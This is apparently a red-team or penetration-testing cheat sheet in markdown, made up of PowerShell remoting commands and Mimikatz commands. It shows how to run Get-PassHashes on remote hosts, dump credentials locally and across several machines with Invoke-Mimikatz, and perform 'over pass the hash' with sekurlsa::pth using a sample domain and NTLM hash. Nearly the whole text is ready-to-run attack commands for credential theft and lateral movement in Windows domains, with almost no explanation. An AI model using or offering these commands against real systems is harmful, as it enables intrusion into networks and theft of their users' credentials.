##Method - PSSession 

```
Enter-PSSession -ComputerName domain.host #PSSession through computer name

Invoke-Command -ScriptBlock {whoami; hostname; ipconfig} -ComputerName domain.host #Use below to execute commands or scriptblocks:

Invoke-Command –FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName domain.host #Use below to execute scripts from files

Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName domain.host #Use below to execute locally loaded function on the remote machines

Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName domain.host -ArgumentList  #In this case, we are passing Arguments. Keep in mind that onlypositional arguments could be passed this way:

Invoke-Command –Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName domain.host #In below, a function call within the script is used
```

#Use below to execute "Stateful" commands using Invoke-Command:

```
$Sess = New-PSSession –Computername domain.host
Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get-Process}
Invoke-Command –Session $Sess –ScriptBlock {$Proc.Name}
Enter-PSSession -Session $Sess 
```

#Over The Pass (Using Mimikatz)

```
Invoke-Mimikatz -DumpCreds #Dump credentials on a local machine.

Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2") #Dump credentials on multiple remote machines

Invoke-Mimikatz -Command '"sekurlsa::pth /user:devsrv /domain:[domain_name] /ntlm:[ntlm_hash] /run:powershell.exe"' #"Over pass the hash" generate tokens from hashes.

Example -

Invoke-Mimikatz -Command '"sekurlsa::pth /user:devsrv /domain:devsrv.garrison.castle.local /ntlm: 578a73f4bc935b99cb7a2eba6f8c0096 /run:powershell.exe"'


```







 
```

